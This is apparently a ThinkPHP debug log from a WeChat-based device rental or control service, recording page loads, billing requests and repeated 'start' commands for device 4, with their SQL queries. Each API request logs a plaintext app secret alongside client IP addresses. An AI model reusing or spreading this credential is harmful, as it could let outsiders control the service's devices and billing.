[ info ] [ PARAM ] array (
  'id' => '4',
)
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /data/www/csgx2/application/wxapi/view/device_work.php [ array (
  0 => 'dev',
  1 => 'setmeal',
) ]
[ sql ] [ DB ] CONNECT:[ UseTime:0.000501s ] mysql:host=127.0.0.1;port=3306;dbname=liangzi;charset=utf8mb4
[ sql ] [ SQL ] SHOW COLUMNS FROM `bg_device` [ RunTime:0.001369s ]
[ sql ] [ SQL ] SELECT * FROM `bg_device` WHERE  `id` = 4 LIMIT 1 [ RunTime:0.000370s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `h_meal` [ RunTime:0.001017s ]
[ sql ] [ SQL ] SELECT * FROM `h_meal` WHERE  `id` IN (1,2,3) [ RunTime:0.000340s ]
---------------------------------------------------------------
[2019-06-04T14:53:30+08:00] 115.171.245.110 GET csgxjk.com/wx/device/work/4
[运行时间：0.034049s] [吞吐率：29.37req/s] [内存消耗：3,849.44kb] [文件加载：140]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => 'wx/device/work/<id>',
  'route' => 'wxapi/device/work',
  'option' => 
  array (
    'merge_rule_regex' => false,
  ),
  'var' => 
  array (
    'id' => '4',
  ),
)
[ info ] [ HEADER ] array (
  'x-forwarded-for-pound' => '115.171.245.110',
  'x-forwarded-for' => '115.171.245.110',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 7.1.1; OPPO R11 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 MQQBrowser/6.2 TBS/044704 Mobile Safari/537.36 MMWEBID/9384 MicroMessenger/7.0.4.1420(0x2700043B) Process/tools NetType/WIFI Language/zh_CN',
  'upgrade-insecure-requests' => '1',
  'host' => 'csgxjk.com',
  'cookie' => 'thinkphp_show_page_trace=0|0',
  'connection' => 'close',
  'accept-language' => 'zh-CN,en-US;q=0.9',
  'accept-encoding' => 'gzip',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,image/wxpic,image/sharpp,image/apng,image/tpg,*/*;q=0.8',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'id' => '4',
)
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /data/www/csgx2/application/wxapi/view/device_work.php [ array (
  0 => 'dev',
  1 => 'setmeal',
) ]
[ sql ] [ DB ] CONNECT:[ UseTime:0.000485s ] mysql:host=127.0.0.1;port=3306;dbname=liangzi;charset=utf8mb4
[ sql ] [ SQL ] SHOW COLUMNS FROM `bg_device` [ RunTime:0.001394s ]
[ sql ] [ SQL ] SELECT * FROM `bg_device` WHERE  `id` = 4 LIMIT 1 [ RunTime:0.000359s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `h_meal` [ RunTime:0.001014s ]
[ sql ] [ SQL ] SELECT * FROM `h_meal` WHERE  `id` IN (1,2,3) [ RunTime:0.000349s ]
---------------------------------------------------------------
[2019-06-04T14:53:31+08:00] 39.96.87.22 POST csgxjk.com/api/device/100/work
[运行时间：0.026641s] [吞吐率：37.54req/s] [内存消耗：3,251.53kb] [文件加载：86]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => 'api/device/100/work',
  'route' => 'api/api100/work',
  'option' => 
  array (
    'merge_rule_regex' => false,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'content-type' => 'application/x-www-form-urlencoded',
  'content-length' => '122',
  'accept' => '*/*',
  'host' => 'csgxjk.com',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 7.1.1; OPPO R11 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 MQQBrowser/6.2 TBS/044704 Mobile Safari/537.36 MMWEBID/9384 MicroMessenger/7.0.4.1420(0x2700043B) Process/tools NetType/WIFI Language/zh_CN',
)
[ info ] [ PARAM ] array (
  'appid' => '1',
  'secret' => 'csgx@xt@eUmkdL#2H',
  'timestamp' => '1559631211',
  'devid' => '4',
  'command' => 'start',
  'long' => '600',
  'sign' => '12e2f95422c019694873a6765c7cf84e',
)
[ info ] [ DB ] INIT mysql
[ sql ] [ DB ] CONNECT:[ UseTime:0.000418s ] mysql:host=127.0.0.1;port=3306;dbname=liangzi;charset=utf8mb4
[ sql ] [ SQL ] SHOW COLUMNS FROM `bg_device` [ RunTime:0.001340s ]
[ sql ] [ SQL ] SELECT * FROM `bg_device` WHERE  `id` = 4 LIMIT 1 [ RunTime:0.000371s ]
---------------------------------------------------------------
[2019-06-04T14:53:31+08:00] 115.171.245.110 POST csgxjk.com/wx/device/bill.html
[运行时间：0.121723s] [吞吐率：8.22req/s] [内存消耗：3,689.44kb] [文件加载：134]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => 'wx/device/bill',
  'route' => 'wxapi/device/bill',
  'option' => 
  array (
    'merge_rule_regex' => false,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'x-requested-with' => 'XMLHttpRequest',
  'x-forwarded-for-pound' => '115.171.245.110',
  'x-forwarded-for' => '115.171.245.110',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 7.1.1; OPPO R11 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 MQQBrowser/6.2 TBS/044704 Mobile Safari/537.36 MMWEBID/9384 MicroMessenger/7.0.4.1420(0x2700043B) Process/tools NetType/WIFI Language/zh_CN',
  'referer' => 'http://csgxjk.com/wx/device/work/4',
  'origin' => 'http://csgxjk.com',
  'host' => 'csgxjk.com',
  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
  'content-length' => '14',
  'connection' => 'close',
  'accept-language' => 'zh-CN,en-US;q=0.9',
  'accept-encoding' => 'gzip',
  'accept' => '*/*',
)
[ info ] [ PARAM ] array (
  'did' => '4',
  'mealid' => '2',
)
[ info ] [ DB ] INIT mysql
[ sql ] [ DB ] CONNECT:[ UseTime:0.000496s ] mysql:host=127.0.0.1;port=3306;dbname=liangzi;charset=utf8mb4
[ sql ] [ SQL ] SHOW COLUMNS FROM `h_meal` [ RunTime:0.001383s ]
[ sql ] [ SQL ] SELECT * FROM `h_meal` WHERE  `id` = 2 LIMIT 1 [ RunTime:0.000339s ]
---------------------------------------------------------------
[2019-06-04T14:53:35+08:00] 39.96.87.22 POST csgxjk.com/api/device/100/work
[运行时间：0.026324s] [吞吐率：37.99req/s] [内存消耗：3,251.53kb] [文件加载：86]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => 'api/device/100/work',
  'route' => 'api/api100/work',
  'option' => 
  array (
    'merge_rule_regex' => false,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'content-type' => 'application/x-www-form-urlencoded',
  'content-length' => '122',
  'accept' => '*/*',
  'host' => 'csgxjk.com',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 7.1.1; OPPO R11 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 MQQBrowser/6.2 TBS/044704 Mobile Safari/537.36 MMWEBID/9384 MicroMessenger/7.0.4.1420(0x2700043B) Process/tools NetType/WIFI Language/zh_CN',
)
[ info ] [ PARAM ] array (
  'appid' => '1',
  'secret' => 'csgx@xt@eUmkdL#2H',
  'timestamp' => '1559631215',
  'devid' => '4',
  'command' => 'start',
  'long' => '600',
  'sign' => 'd68655fbe036e0a2eedebc0df9376754',
)
[ info ] [ DB ] INIT mysql
[ sql ] [ DB ] CONNECT:[ UseTime:0.000399s ] mysql:host=127.0.0.1;port=3306;dbname=liangzi;charset=utf8mb4
[ sql ] [ SQL ] SHOW COLUMNS FROM `bg_device` [ RunTime:0.001289s ]
[ sql ] [ SQL ] SELECT * FROM `bg_device` WHERE  `id` = 4 LIMIT 1 [ RunTime:0.000351s ]
---------------------------------------------------------------
[2019-06-04T14:53:35+08:00] 115.171.245.110 POST csgxjk.com/wx/device/bill.html
[运行时间：0.072775s] [吞吐率：13.74req/s] [内存消耗：3,689.44kb] [文件加载：134]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => 'wx/device/bill',
  'route' => 'wxapi/device/bill',
  'option' => 
  array (
    'merge_rule_regex' => false,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'x-requested-with' => 'XMLHttpRequest',
  'x-forwarded-for-pound' => '115.171.245.110',
  'x-forwarded-for' => '115.171.245.110',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 7.1.1; OPPO R11 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 MQQBrowser/6.2 TBS/044704 Mobile Safari/537.36 MMWEBID/9384 MicroMessenger/7.0.4.1420(0x2700043B) Process/tools NetType/WIFI Language/zh_CN',
  'referer' => 'http://csgxjk.com/wx/device/work/4',
  'origin' => 'http://csgxjk.com',
  'host' => 'csgxjk.com',
  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
  'content-length' => '14',
  'connection' => 'close',
  'accept-language' => 'zh-CN,en-US;q=0.9',
  'accept-encoding' => 'gzip',
  'accept' => '*/*',
)
[ info ] [ PARAM ] array (
  'did' => '4',
  'mealid' => '2',
)
[ info ] [ DB ] INIT mysql
[ sql ] [ DB ] CONNECT:[ UseTime:0.000503s ] mysql:host=127.0.0.1;port=3306;dbname=liangzi;charset=utf8mb4
[ sql ] [ SQL ] SHOW COLUMNS FROM `h_meal` [ RunTime:0.001344s ]
[ sql ] [ SQL ] SELECT * FROM `h_meal` WHERE  `id` = 2 LIMIT 1 [ RunTime:0.000318s ]
---------------------------------------------------------------
[2019-06-04T14:53:41+08:00] 115.171.245.110 GET csgxjk.com/wx/device/work/4
[运行时间：0.034917s] [吞吐率：28.64req/s] [内存消耗：3,849.44kb] [文件加载：140]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => 'wx/device/work/<id>',
  'route' => 'wxapi/device/work',
  'option' => 
  array (
    'merge_rule_regex' => false,
  ),
  'var' => 
  array (
    'id' => '4',
  ),
)
[ info ] [ HEADER ] array (
  'x-forwarded-for-pound' => '115.171.245.110',
  'x-forwarded-for' => '115.171.245.110',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 7.1.1; OPPO R11 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 MQQBrowser/6.2 TBS/044704 Mobile Safari/537.36 MMWEBID/9384 MicroMessenger/7.0.4.1420(0x2700043B) Process/tools NetType/WIFI Language/zh_CN',
  'upgrade-insecure-requests' => '1',
  'host' => 'csgxjk.com',
  'cookie' => 'thinkphp_show_page_trace=0|0',
  'connection' => 'close',
  'accept-language' => 'zh-CN,en-US;q=0.9',
  'accept-encoding' => 'gzip',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,image/wxpic,image/sharpp,image/apng,image/tpg,*/*;q=0.8',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'id' => '4',
)
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /data/www/csgx2/application/wxapi/view/device_work.php [ array (
  0 => 'dev',
  1 => 'setmeal',
) ]
[ sql ] [ DB ] CONNECT:[ UseTime:0.000481s ] mysql:host=127.0.0.1;port=3306;dbname=liangzi;charset=utf8mb4
[ sql ] [ SQL ] SHOW COLUMNS FROM `bg_device` [ RunTime:0.001392s ]
[ sql ] [ SQL ] SELECT * FROM `bg_device` WHERE  `id` = 4 LIMIT 1 [ RunTime:0.000367s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `h_meal` [ RunTime:0.001049s ]
[ sql ] [ SQL ] SELECT * FROM `h_meal` WHERE  `id` IN (1,2,3) [ RunTime:0.000321s ]
---------------------------------------------------------------
[2019-06-04T14:53:42+08:00] 39.96.87.22 POST csgxjk.com/api/device/100/work
[运行时间：0.026376s] [吞吐率：37.91req/s] [内存消耗：3,251.53kb] [文件加载：86]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => 'api/device/100/work',
  'route' => 'api/api100/work',
  'option' => 
  array (
    'merge_rule_regex' => false,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'content-type' => 'application/x-www-form-urlencoded',
  'content-length' => '122',
  'accept' => '*/*',
  'host' => 'csgxjk.com',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 7.1.1; OPPO R11 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 MQQBrowser/6.2 TBS/044704 Mobile Safari/537.36 MMWEBID/9384 MicroMessenger/7.0.4.1420(0x2700043B) Process/tools NetType/WIFI Language/zh_CN',
)
[ info ] [ PARAM ] array (
  'appid' => '1',
  'secret' => 'csgx@xt@eUmkdL#2H',
  'timestamp' => '1559631222',
  'devid' => '4',
  'command' => 'start',
  'long' => '600',
  'sign' => '658074482b0089dd62f202ba044605d1',
)
[ info ] [ DB ] INIT mysql
[ sql ] [ DB ] CONNECT:[ UseTime:0.000396s ] mysql:host=127.0.0.1;port=3306;dbname=liangzi;charset=utf8mb4
[ sql ] [ SQL ] SHOW COLUMNS FROM `bg_device` [ RunTime:0.001287s ]
[ sql ] [ SQL ] SELECT * FROM `bg_device` WHERE  `id` = 4 LIMIT 1 [ RunTime:0.000363s ]
---------------------------------------------------------------
[2019-06-04T14:53:42+08:00] 115.171.245.110 POST csgxjk.com/wx/device/bill.html
[运行时间：0.064207s] [吞吐率：15.57req/s] [内存消耗：3,689.44kb] [文件加载：134]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => 'wx/device/bill',
  'route' => 'wxapi/device/bill',
  'option' => 
  array (
    'merge_rule_regex' => false,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'x-requested-with' => 'XMLHttpRequest',
  'x-forwarded-for-pound' => '115.171.245.110',
  'x-forwarded-for' => '115.171.245.110',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 7.1.1; OPPO R11 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 MQQBrowser/6.2 TBS/044704 Mobile Safari/537.36 MMWEBID/9384 MicroMessenger/7.0.4.1420(0x2700043B) Process/tools NetType/WIFI Language/zh_CN',
  'referer' => 'http://csgxjk.com/wx/device/work/4',
  'origin' => 'http://csgxjk.com',
  'host' => 'csgxjk.com',
  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
  'content-length' => '14',
  'connection' => 'close',
  'accept-language' => 'zh-CN,en-US;q=0.9',
  'accept-encoding' => 'gzip',
  'accept' => '*/*',
)
[ info ] [ PARAM ] array (
  'did' => '4',
  'mealid' => '2',
)
[ info ] [ DB ] INIT mysql
[ sql ] [ DB ] CONNECT:[ UseTime:0.000484s ] mysql:host=127.0.0.1;port=3306;dbname=liangzi;charset=utf8mb4
[ sql ] [ SQL ] SHOW COLUMNS FROM `h_meal` [ RunTime:0.001360s ]
[ sql ] [ SQL ] SELECT * FROM `h_meal` WHERE  `id` = 2 LIMIT 1 [ RunTime:0.000326s ]
---------------------------------------------------------------
[2019-06-04T14:53:44+08:00] 39.96.87.22 POST csgxjk.com/api/device/100/work
[运行时间：0.026723s] [吞吐率：37.42req/s] [内存消耗：3,251.53kb] [文件加载：86]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => 'api/device/100/work',
  'route' => 'api/api100/work',
  'option' => 
  array (
    'merge_rule_regex' => false,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'content-type' => 'application/x-www-form-urlencoded',
  'content-length' => '122',
  'accept' => '*/*',
  'host' => 'csgxjk.com',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 7.1.1; OPPO R11 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 MQQBrowser/6.2 TBS/044704 Mobile Safari/537.36 MMWEBID/9384 MicroMessenger/7.0.4.1420(0x2700043B) Process/tools NetType/WIFI Language/zh_CN',
)
[ info ] [ PARAM ] array (
  'appid' => '1',
  'secret' => 'csgx@xt@eUmkdL#2H',
  'timestamp' => '1559631224',
  'devid' => '4',
  'command' => 'start',
  'long' => '600',
  'sign' => '20522183c4f673e696587cc5a58b9b45',
)
[ info ] [ DB ] INIT mysql
[ sql ] [ DB ] CONNECT:[ UseTime:0.000469s ] mysql:host=127.0.0.1;port=3306;dbname=liangzi;charset=utf8mb4
[ sql ] [ SQL ] SHOW COLUMNS FROM `bg_device` [ RunTime:0.001409s ]
[ sql ] [ SQL ] SELECT * FROM `bg_device` WHERE  `id` = 4 LIMIT 1 [ RunTime:0.000367s ]
---------------------------------------------------------------
[2019-06-04T14:53:44+08:00] 115.171.245.110 POST csgxjk.com/wx/device/bill.html
[运行时间：0.065221s] [吞吐率：15.33req/s] [内存消耗：3,689.44kb] [文件加载：134]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => 'wx/device/bill',
  'route' => 'wxapi/device/bill',
  'option' => 
  array (
    'merge_rule_regex' => false,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'x-requested-with' => 'XMLHttpRequest',
  'x-forwarded-for-pound' => '115.171.245.110',
  'x-forwarded-for' => '115.171.245.110',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 7.1.1; OPPO R11 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 MQQBrowser/6.2 TBS/044704 Mobile Safari/537.36 MMWEBID/9384 MicroMessenger/7.0.4.1420(0x2700043B) Process/tools NetType/WIFI Language/zh_CN',
  'referer' => 'http://csgxjk.com/wx/device/work/4',
  'origin' => 'http://csgxjk.com',
  'host' => 'csgxjk.com',
  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
  'content-length' => '14',
  'connection' => 'close',
  'accept-language' => 'zh-CN,en-US;q=0.9',
  'accept-encoding' => 'gzip',
  'accept' => '*/*',
)
[ info ] [ PARAM ] array (
  'did' => '4',
  'mealid' => '2',
)
[ info ] [ DB ] INIT mysql
[ sql ] [ DB ] CONNECT:[ UseTime:0.000473s ] mysql:host=127.0.0.1;port=3306;dbname=liangzi;charset=utf8mb4
[ sql ] [ SQL ] SHOW COLUMNS FROM `h_meal` [ RunTime:0.001383s ]
[ sql ] [ SQL ] SELECT * FROM `h_meal` WHERE  `id` = 2 LIMIT 1 [ RunTime:0.000334s ]
---------------------------------------------------------------
[2019-06-04T14:53:51+08:00] 115.171.245.110 GET csgxjk.com/wx/device/work/4
[运行时间：0.034417s] [吞吐率：29.06req/s] [内存消耗：3,849.44kb] [文件加载：140]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => 'wx/device/work/<id>',
  'route' => 'wxapi/device/work',
  'option' => 
  array (
    'merge_rule_regex' => false,
  ),
  'var' => 
  array (
    'id' => '4',
  ),
)
[ info ] [ HEADER ] array (
  'x-forwarded-for-pound' => '115.171.245.110',
  'x-forwarded-for' => '115.171.245.110',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 7.1.1; OPPO R11 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 MQQBrowser/6.2 TBS/044704 Mobile Safari/537.36 MMWEBID/9384 MicroMessenger/7.0.4.1420(0x2700043B) Process/tools NetType/WIFI Language/zh_CN',
  'upgrade-insecure-requests' => '1',
  'host' => 'csgxjk.com',
  'cookie' => 'thinkphp_show_page_trace=0|0',
  'connection' => 'close',
  'accept-language' => 'zh-CN,en-US;q=0.9',
  'accept-encoding' => 'gzip',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,image/wxpic,image/sharpp,image/apng,image/tpg,*/*;q=0.8',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'id' => '4',
)
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /data/www/csgx2/application/wxapi/view/device_work.php [ array (
  0 => 'dev',
  1 => 'setmeal',
) ]
[ sql ] [ DB ] CONNECT:[ UseTime:0.000496s ] mysql:host=127.0.0.1;port=3306;dbname=liangzi;charset=utf8mb4
[ sql ] [ SQL ] SHOW COLUMNS FROM `bg_device` [ RunTime:0.001375s ]
[ sql ] [ SQL ] SELECT * FROM `bg_device` WHERE  `id` = 4 LIMIT 1 [ RunTime:0.000372s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `h_meal` [ RunTime:0.001022s ]
[ sql ] [ SQL ] SELECT * FROM `h_meal` WHERE  `id` IN (1,2,3) [ RunTime:0.000322s ]
---------------------------------------------------------------
[2019-06-04T14:53:52+08:00] 39.96.87.22 POST csgxjk.com/api/device/100/work
[运行时间：0.026388s] [吞吐率：37.90req/s] [内存消耗：3,251.53kb] [文件加载：86]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => 'api/device/100/work',
  'route' => 'api/api100/work',
  'option' => 
  array (
    'merge_rule_regex' => false,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'content-type' => 'application/x-www-form-urlencoded',
  'content-length' => '122',
  'accept' => '*/*',
  'host' => 'csgxjk.com',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 7.1.1; OPPO R11 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 MQQBrowser/6.2 TBS/044704 Mobile Safari/537.36 MMWEBID/9384 MicroMessenger/7.0.4.1420(0x2700043B) Process/tools NetType/WIFI Language/zh_CN',
)
[ info ] [ PARAM ] array (
  'appid' => '1',
  'secret' => 'csgx@xt@eUmkdL#2H',
  'timestamp' => '1559631232',
  'devid' => '4',
  'command' => 'start',
  'long' => '600',
  'sign' => '8f9ce5b98a02debc4595245088faf00e',
)
[ info ] [ DB ] INIT mysql
[ sql ] [ DB ] CONNECT:[ UseTime:0.000442s ] mysql:host=127.0.0.1;port=3306;dbname=liangzi;charset=utf8mb4
[ sql ] [ SQL ] SHOW COLUMNS FROM `bg_device` [ RunTime:0.001309s ]
[ sql ] [ SQL ] SELECT * FROM `bg_device` WHERE  `id` = 4 LIMIT 1 [ RunTime:0.000382s ]
---------------------------------------------------------------
[2019-06-04T14:53:52+08:00] 115.171.245.110 POST csgxjk.com/wx/device/bill.html
[运行时间：0.071406s] [吞吐率：14.00req/s] [内存消耗：3,689.44kb] [文件加载：134]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => 'wx/device/bill',
  'route' => 'wxapi/device/bill',
  'option' => 
  array (
    'merge_rule_regex' => false,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'x-requested-with' => 'XMLHttpRequest',
  'x-forwarded-for-pound' => '115.171.245.110',
  'x-forwarded-for' => '115.171.245.110',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 7.1.1; OPPO R11 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 MQQBrowser/6.2 TBS/044704 Mobile Safari/537.36 MMWEBID/9384 MicroMessenger/7.0.4.1420(0x2700043B) Process/tools NetType/WIFI Language/zh_CN',
  'referer' => 'http://csgxjk.com/wx/device/work/4',
  'origin' => 'http://csgxjk.com',
  'host' => 'csgxjk.com',
  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
  'content-length' => '14',
  'connection' => 'close',
  'accept-language' => 'zh-CN,en-US;q=0.9',
  'accept-encoding' => 'gzip',
  'accept' => '*/*',
)
[ info ] [ PARAM ] array (
  'did' => '4',
  'mealid' => '2',
)
[ info ] [ DB ] INIT mysql
[ sql ] [ DB ] CONNECT:[ UseTime:0.000463s ] mysql:host=127.0.0.1;port=3306;dbname=liangzi;charset=utf8mb4
[ sql ] [ SQL ] SHOW COLUMNS FROM `h_meal` [ RunTime:0.001347s ]
[ sql ] [ SQL ] SELECT * FROM `h_meal` WHERE  `id` = 2 LIMIT 1 [ RunTime:0.000328s ]
---------------------------------------------------------------
[2019-06-04T14:53:58+08:00] 39.96.87.22 POST csgxjk.com/api/device/100/work
[运行时间：0.026971s] [吞吐率：37.08req/s] [内存消耗：3,251.53kb] [文件加载：86]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => 'api/device/100/work',
  'route' => 'api/api100/work',
  'option' => 
  array (
    'merge_rule_regex' => false,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'content-type' => 'application/x-www-form-urlencoded',
  'content-length' => '122',
  'accept' => '*/*',
  'host' => 'csgxjk.com',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 7.1.1; OPPO R11 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 MQQBrowser/6.2 TBS/044704 Mobile Safari/537.36 MMWEBID/9384 MicroMessenger/7.0.4.1420(0x2700043B) Process/tools NetType/WIFI Language/zh_CN',
)
[ info ] [ PARAM ] array (
  'appid' => '1',
  'secret' => 'csgx@xt@eUmkdL#2H',
  'timestamp' => '1559631238',
  'devid' => '4',
  'command' => 'start',
  'long' => '600',
  'sign' => '40fb64570f4f141fc676a5c1893db4a4',
)
[ info ] [ DB ] INIT mysql
[ sql ] [ DB ] CONNECT:[ UseTime:0.000448s ] mysql:host=127.0.0.1;port=3306;dbname=liangzi;charset=utf8mb4
[ sql ] [ SQL ] SHOW COLUMNS FROM `bg_device` [ RunTime:0.001423s ]
[ sql ] [ SQL ] SELECT * FROM `bg_device` WHERE  `id` = 4 LIMIT 1 [ RunTime:0.000352s ]
---------------------------------------------------------------
[2019-06-04T14:53:58+08:00] 115.171.245.110 POST csgxjk.com/wx/device/bill.html
[运行时间：0.065653s] [吞吐率：15.23req/s] [内存消耗：3,689.44kb] [文件加载：134]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => 'wx/device/bill',
  'route' => 'wxapi/device/bill',
  'option' => 
  array (
    'merge_rule_regex' => false,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'x-requested-with' => 'XMLHttpRequest',
  'x-forwarded-for-pound' => '115.171.245.110',
  'x-forwarded-for' => '115.171.245.110',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 7.1.1; OPPO R11 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 MQQBrowser/6.2 TBS/044704 Mobile Safari/537.36 MMWEBID/9384 MicroMessenger/7.0.4.1420(0x2700043B) Process/tools NetType/WIFI Language/zh_CN',
  'referer' => 'http://csgxjk.com/wx/device/work/4',
  'origin' => 'http://csgxjk.com',
  'host' => 'csgxjk.com',
  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
  'content-length' => '14',
  'connection' => 'close',
  'accept-language' => 'zh-CN,en-US;q=0.9',
  'accept-encoding' => 'gzip',
  'accept' => '*/*',
)
[ info ] [ PARAM ] array (
  'did' => '4',
  'mealid' => '2',
)
[ info ] [ DB ] INIT mysql
[ sql ] [ DB ] CONNECT:[ UseTime:0.000517s ] mysql:host=127.0.0.1;port=3306;dbname=liangzi;charset=utf8mb4
[ sql ] [ SQL ] SHOW COLUMNS FROM `h_meal` [ RunTime:0.001490s ]
[ sql ] [ SQL ] SELECT * FROM `h_meal` WHERE  `id` = 2 LIMIT 1 [ RunTime:0.000335s ]
---------------------------------------------------------------
[2019-06-04T14:54:12+08:00] 39.96.87.22 POST csgxjk.com/api/device/100/work
[运行时间：0.027148s] [吞吐率：36.84req/s] [内存消耗：3,251.53kb] [文件加载：86]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => 'api/device/100/work',
  'route' => 'api/api100/work',
  'option' => 
  array (
    'merge_rule_regex' => false,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'content-type' => 'application/x-www-form-urlencoded',
  'content-length' => '122',
  'accept' => '*/*',
  'host' => 'csgxjk.com',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 7.1.1; OPPO R11 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 MQQBrowser/6.2 TBS/044704 Mobile Safari/537.36 MMWEBID/9384 MicroMessenger/7.0.4.1420(0x2700043B) Process/tools NetType/WIFI Language/zh_CN',
)
[ info ] [ PARAM ] array (
  'appid' => '1',
  'secret' => 'csgx@xt@eUmkdL#2H',
  'timestamp' => '1559631252',
  'devid' => '4',
  'command' => 'start',
  'long' => '600',
  'sign' => 'c7e15d2abeb55636bb93b3dd37de449a',
)
[ info ] [ DB ] INIT mysql
